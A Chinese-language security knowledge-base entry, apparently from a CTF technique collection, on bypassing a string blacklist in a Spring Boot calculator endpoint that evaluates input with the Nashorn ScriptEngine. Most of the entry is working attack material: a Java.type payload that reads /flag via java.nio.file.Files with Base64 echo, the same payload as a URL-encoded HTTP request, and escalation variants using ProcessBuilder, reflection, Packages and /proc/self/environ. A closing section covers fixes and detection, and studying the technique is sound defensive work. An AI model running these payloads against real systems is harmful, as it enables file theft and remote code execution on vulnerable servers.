---
id: web-java-rce-nashorn-java-type-blacklist-file-read
title: Nashorn ScriptEngine 黑名单绕过：Java.type 直接引用 java.nio.file.Files 读文件
type: scenario
domain: web
path: web/java/rce
technique: nashorn-java-type-blacklist-bypass-file-read
aliases:
- Nashorn 沙箱绕过
- Java.type
- ScriptEngine 黑名单绕过
- getEngineByName("js")
- java.nio.file.Files
- 眼熟的计算器
- Java 脚本引擎 RCE
tags:
- java
- nashorn
- scriptengine
- blacklist-bypass
- file-read
- rce
- spring-boot
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:11:55+08:00'
  notes: 已对照原文核对；Nashorn 源码、黑名单与 Java.type 读文件 payload 一致；未复跑。
---

## 一句话结论

Spring Boot 的 `/calc` 把用户输入交给 `ScriptEngineManager().getEngineByName("js").eval(content)`，只用 `content.contains()` 黑名单拦 `import`、`java.lang.Runtime`、`new` 时，可用 Nashorn 内置的 `Java.type(...)` 直接引用 `java.nio.file.Files`/`Paths` 读取 `/flag`，再用 `java.util.Base64` 编码回显；全程不需要 `import`、`Runtime` 或 `new`，黑名单形同虚设。

## 原理

- **Nashorn 的 Java 互操作**：JDK 8/11 的 Nashorn 脚本引擎提供 `Java.type("完全限定类名")` 全局函数，可以在脚本中直接取得任意 Java 类并调用其静态方法/构造器；这是 Nashorn 的设计功能，不是漏洞，但在“把用户输入当脚本执行”的场景中就是沙箱逃逸原语。
- **黑名单只匹配字面量**：代码检查 `content.contains("import")`、`contains("java.lang.Runtime")`、`contains("new")`；`Java.type`、`java.nio.file.Files`、`java.util.Base64` 都不在黑名单中，且不需要 `new`（`Paths.get`/`Files.readAllBytes`/`Base64.getEncoder()` 都是静态方法）。
- **读文件链**：`Java.type("java.nio.file.Paths").get("/flag")` 得到 `Path`；`Java.type("java.nio.file.Files").readAllBytes(path)` 返回 `byte[]`；`Java.type("java.util.Base64").getEncoder().encodeToString(bytes)` 把字节数组编码成可回显的 Base64 字符串，避免直接 `toString()` 只得到 `[B@hash`。
- **为什么用 Base64**：`ScriptEngine.eval` 的返回值会被 `result.toString()` 转成字符串；`byte[]` 的 `toString()` 是数组哈希，不能回显内容；Base64 编码后是普通 String，能完整带回 flag。
- **为什么成立**：应用把脚本引擎当计算器，但脚本引擎的能力远超算术；黑名单没有覆盖 `Java.type`、反射、文件 API、进程 API 等等价入口。根因是“用黑名单限制图灵完备的脚本引擎”，而不是白名单/隔离执行。
- **影响扩大**：同样可用 `Java.type("java.lang.Runtime").getRuntime().exec(...)`（但 `java.lang.Runtime` 被拦，可换 `ProcessBuilder`、`java.lang.ProcessBuilder`、反射 `Class.forName`、`java.lang.System` 等）；也可读写文件、加载类、发起网络请求。

## 触发条件

- 应用使用 `ScriptEngineManager().getEngineByName("js")`（JDK 8/11 的 Nashorn，或带 Nashorn 的 JDK）执行用户可控字符串。
- 过滤仅为 `String.contains` 黑名单，未使用脚本沙箱/类白名单/禁用 Java 互操作。
- 目标 JDK 仍包含 Nashorn（JDK 15+ 默认移除；GraalJS 的互操作方式不同）。
- 攻击者能访问该接口并提交任意字符串；进程对目标文件有读权限。
- 回显 `result.toString()` 或错误信息可用于带出数据。

## 利用步骤

1. 确认接口与引擎：提交 `1+1` 返回 `2`，说明表达式被 eval；提交含 `import`/`new`/`java.lang.Runtime` 的 payload 观察黑名单提示，确认过滤范围。
2. 用 `Java.type` 探测类：`Java.type("java.lang.System").getProperty("java.version")`，确认 Java 互操作可用。
3. 读文件并 Base64 回显：
   ```text
   1+1; Java.type("java.util.Base64").getEncoder().encodeToString(Java.type("java.nio.file.Files").readAllBytes(Java.type("java.nio.file.Paths").get("/flag")))
   ```
4. 把返回的 Base64 解码得到 flag；若 `/flag` 不存在，尝试 `/flag.txt`、`/proc/self/environ`、应用配置文件。
5. 若需要命令执行，尝试 `Java.type("java.lang.ProcessBuilder")`（注意 `new` 被拦时用 `Java.type(...).new`? Nashorn 的 `new` 关键字被拦，可尝试 `Java.type("java.lang.ProcessBuilder").class.getDeclaredConstructors()[0].newInstance(...)` 或反射；具体取决于黑名单与 JDK）。
6. 若 `Java.type` 被拦，尝试 `load("nashorn:mozilla_compat.js")`、`Packages.java.nio.file.Files`、`java.lang.Class.forName` 等变体。

## PoC

原文 payload（读 `/flag` 并 Base64 回显）：

```javascript
1+1; Java.type("java.util.Base64").getEncoder().encodeToString(Java.type("java.nio.file.Files").readAllBytes(Java.type("java.nio.file.Paths").get("/flag")))
```

HTTP 请求：

```http
GET /calc?content=1%2B1%3B%20Java.type(%22java.util.Base64%22).getEncoder().encodeToString(Java.type(%22java.nio.file.Files%22).readAllBytes(Java.type(%22java.nio.file.Paths%22).get(%22%2Fflag%22))) HTTP/1.1
Host: target
```

返回示例（Base64）：

```text
ZmxhZ3s2YjU3MTRiMC0yYTQwLTQ2NWItODAxNi1jOWE2YmNmNTBhMTZ9
```

解码：

```python
import base64
print(base64.b64decode("ZmxhZ3s2YjU3MTRiMC0yYTQwLTQ2NWItODAxNi1jOWE2YmNmNTBhMTZ9"))
```

## 变体与关联

- 变体：`java.lang.Runtime` 被拦时用 `java.lang.ProcessBuilder`、`java.lang.ProcessImpl`、`java.lang.System` + `load`/`getenv`、反射 `Class.forName("java.lang.Runtime")`、`Java.type("javax.script.ScriptEngineManager")` 二次 eval 等。
- 变体：JDK 15+ 无 Nashorn，但可能使用 GraalJS/其它 JSR-223 引擎；互操作 API 与过滤点不同，需要重测。
- 变体：黑名单覆盖 `Java.type` 时，可用 `Packages`、`JavaImporter`、`load`、`__noSuchProperty__`、`Class.forName` 等；本质是脚本引擎能力面太大。
- 关联：[[web-java-rce-nashorn-bcel-jsp-webshell-av-bypass]]（Nashorn + BCEL 免杀 webshell）、[[web-java-expression-spel-waf-bypass-scriptengine-reflection]]（ScriptEngine/SpEL 绕过）、[[web-java-component-smartbi-rmiservlet-js-rhino-expression-rce]]（Rhino 表达式注入）、[[web-java-expression-ognl-jshell-eval-bypass]]（OGNL/JShel 绕过）。
- 边界：使用真正的沙箱（禁止 Java 互操作/类白名单）、JDK 无 Nashorn、输入被严格白名单为算术字符、进程无文件读权限时，该链不成立。

## 检测与防御

- **修复**：不要对用户输入使用 `eval`/`ScriptEngine`；如必须计算表达式，使用专门的算术解析器（只允许数字/运算符/括号）并限制长度。
- **隔离**：若必须执行脚本，使用独立沙箱（禁止 `Java.type`/`Packages`/反射/文件/网络/进程 API）、低权限进程、容器/VM，并设置超时与资源限制。
- **加固**：升级到无 Nashorn 的 JDK 或移除脚本引擎依赖；使用 SecurityManager（已弃用）/Seccomp/AppArmor 限制文件与进程；最小权限运行。
- **检测**：监控 `/calc` 等接口参数中的 `Java.type`、`Packages`、`Class.forName`、`getRuntime`、`ProcessBuilder`、`Files.readAllBytes`、`Base64` 等组合；检测脚本引擎异常类加载/文件读取；WAF 规则覆盖黑名单等价写法。
- **响应**：确认 RCE 后隔离主机、检查文件读取/写入与进程创建、轮换凭据；修复接口并审计同类 `eval` 使用。
